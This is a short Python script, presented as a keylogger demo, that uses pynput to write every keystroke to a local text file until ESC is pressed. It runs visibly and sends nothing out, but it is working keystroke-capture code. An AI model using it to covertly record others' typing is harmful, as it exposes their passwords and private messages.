from pynput import keyboard

log_file = "keystroke.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop logging when ESC is pressed
    if key == keyboard.Key.esc:
        print("\nStopping keylogger...")
        return False

print("Keylogger demo started.")
print("Press ESC to stop.\n")

with keyboard.Listener(on_press=on_press,
                       on_release=on_release) as listener:
    listener.join()
